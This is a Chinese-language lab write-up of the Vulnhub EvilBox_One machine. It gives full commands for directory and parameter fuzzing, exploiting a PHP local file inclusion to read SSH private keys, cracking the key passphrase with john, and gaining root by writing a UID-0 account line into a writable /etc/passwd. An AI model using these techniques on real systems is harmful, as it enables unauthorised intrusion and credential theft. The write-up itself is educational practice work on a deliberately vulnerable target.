---
title: Chapter6_Easy_EvilBox_One
categories:
- Network_Security
- Vulnhub
- Chapter6
tags:
- Network_Security
- Vulnhub
date: 2024-02-02 14:20:38
---

# EvilBox_One 学习记录

## 1. 粗略学习记录

### 1.1 扫描打点 - PHP LFI

1. kali 自带的 fping 扫描
    `fping -gaq ip/cidr # g--generate a--alive q--quiet`
    ![image-20240201120011124](image-20240201120011124.png)

2. 扫描端口：
    ![image-20240201120047911](image-20240201120047911.png)

3. 路径爆破：
    ![image-20240201131818180](image-20240201131818180.png)
    尝试新工具：gobuster。
    gobuster 除了路径爆破，还会探测 CDN。其是用 go 语言编写的。
    `gobuster dir -u http://192.168.0.105 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp`
    ![image-20240201133031374](image-20240201133031374.png)

4. 访问一下，robots.txt 给了一串不明意义的字符串：`H4x0r`。/secret 访问是空白。
    ![image-20240201132104426](image-20240201132104426.png)

5. /secret 是新的路径，那么更换目标，再在 /secret 下进行目录爆破：
    ![image-20240201133327362](image-20240201133327362.png)

6. 访问 evil.php，结果还是空白。这时就要考虑进行参数爆破。除了 Burpsuite，这里使用 ffuf：
    `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:param -w value.txt:value -u http://192.168.0.105/secret/evil.php?param=value -fs 0`，其中 value.txt 自己编辑，由常见的字符和符号组成。`-fs 0` 表示过滤掉页面为空的结果。是用的是 Burpsuite 的字典。
    ![image-20240201140607609](image-20240201140607609.png)
    结果没有结果。
    考虑是 PHP，往文件包含的思路靠拢，修改 value。
    `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:param -u http://192.168.0.105/secret/evil.php?param=../index.html -fs 0`
    结果是有结果了：
    ![image-20240201141210002](image-20240201141210002.png)

7. 猜测是有文件包含漏洞，使用伪协议来读取 evil.php 的内容：
    ![image-20240201141536379](image-20240201141536379.png)
    解码后为：

    ```php
    <?php
        $filename = $_GET['command'];
        include($filename);
    ?>
    ```

8. 考虑 RFI 远程文件包含，在 kali 的 `/var/www/html` 下新建一句话，然后开启 apache2 服务：`systemctl start apache2`。访问：`evil.php?command=http://192.168.0.2/webshell.php?webshell=ls`。结果没有返回。因此目标可能只有 LFI 本地文件包含。

9. 试了一下 `input`，发现不能执行 PHP 代码。说明 `allow_url_include = false`。同样的 `filter` 也写入失败。

### 1.2 拿到 Shell - SSH 的公钥认证体系

1. 查看账户文件，有用户 mowree，使用 `ssh mowree@192.168.0.105 -v` 查看其可以登录的方式，结果有新发现：
    ![image-20240201145439517](image-20240201145439517.png)
    密码用 H4x0r 不行。这里看出有公钥的认证方式，因此思路就是：通过 SSH 公钥登录的用户，其主目录的 `.ssh/authorized` 中一般会有登录者的公钥。尝试访问：
    `command=/home/mowree/.ssh/authorized_keys`。结果如下：
    `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne`

2. 根据 SSH 公钥认证的流程，需要一台电脑创建 RSA 的公钥和私钥，其中公钥由服务器保管，私钥分发给授权的用户。如果 SSH 配对的公私钥是服务器创建的，那么其默认的私钥保存地址就是 `.ssh/id_rsa`，而公钥是 `.ssh/id_rsa.pub`。尝试访问 `.ssh/id_rsa`，结果如下：
    ![image-20240201151805457](image-20240201151805457.png)

3. 复制下来，先赋予权限：
    `chmod 600`。
    登录：
    `ssh mowree@192.168.0.105 -i id_rsa`

4. 然后还需要 passphrase，即私钥的密码。这个无法获取，因此考虑爆破：
    ```bash
    cp /usr/share/wordlists/rockyou.txt.gz . # 用这个密码文件来爆破
    gunzip rockyou.txt.gz # 解压
    cd /usr/share/john
    ./ssh2john.py /home/hacker/id_rsa > /home/hacker/桌面/hash # 将密钥文件进行处理，变成可以被 john 工具使用的文件。
    john /home/hacker/桌面/hash --wordlist=/home/hacker/桌面/rockyou.txt
    ```

    成功破解：
    ![image-20240201153517595](image-20240201153517595.png)
    尝试登录，成功！

5. 拿到第一个 flag：
    ![image-20240201154346570](image-20240201154346570.png)

### 1.3 提权 - 文件配置不当

1. 提权，常见的方法都不行。最终考虑一些可编辑的脚本文件，其执行时以 root 权限执行：
    ```bash
    find / -writable 2>/dev/null
    find / -writable 2>/dev/null | grep -v proc # 结果过滤
    ```

    最终发现异常：
    ![image-20240201160102054](image-20240201160102054.png)
    ![image-20240201160224501](image-20240201160224501.png)

2. 那最终目标就是操作 passwd 文件。一个方向就是修改 passwd，将 root 的密码占位符 `x` 换成自己生成的加盐密码，或者新建一个属于 root 组的账号。
    ![image-20240201161007238](image-20240201161007238.png)

    ![image-20240201161858594](image-20240201161858594.png)然后将这个密文复制并覆盖，这时影子文件中的密码将会失效。

3. 获取 flag：
    ![image-20240201161713975](image-20240201161713975.png)

4. 也可以通过建立账户来实现：
    `hacker:$1$ZY4xtyhY$aSKuj8Y8nbqvlYToyAsw9/:0:0:root:/root:/bin/bash` 写入。
    然后登录 hacker 即可。

## 2. 要点总结

1. 新主机发现工具 fping。
2. 新路径爆破工具 gobuster。
3. “子路径爆破”的思想。
4. 参数爆破工具 ffuf 与“参数爆破”的思想
5. SSH 公钥体系的渗透，SSH 公钥体系认证流程，私钥密码爆破。
6. /etc/passwd 文件的属性。
